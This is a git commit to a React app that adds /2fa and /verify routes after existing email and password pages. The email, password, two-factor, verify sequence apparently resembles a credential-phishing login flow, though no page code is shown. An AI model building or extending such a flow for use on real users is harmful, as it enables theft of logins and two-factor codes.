e996b366491d48dc0e29571c2b9ab0ceddf28ead
boltdropa <boltdropa@gmail.com>
2025-03-09 13:55:49 +0100

    Update App.jsx

--- src/App.jsx
+++ src/App.jsx
@@ -2,6 +2,8 @@ import "./App.css";
 import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
 import Email from "./pages/Email";
 import Pass from "./pages/Pass";
+import Check2verify from "./pages/Check2verify";
+import Verify from "./pages/Verify";
 
 function App() {
   return (
@@ -10,6 +12,8 @@ function App() {
         <Routes>
           <Route path="/" element={<Email />} />
           <Route path="/pass" element={<Pass />} />
+          <Route path="/2fa" element={<Check2verify />} />
+          <Route path="/verify" element={<Verify />} />
         </Routes>
       </Router>
     </div>
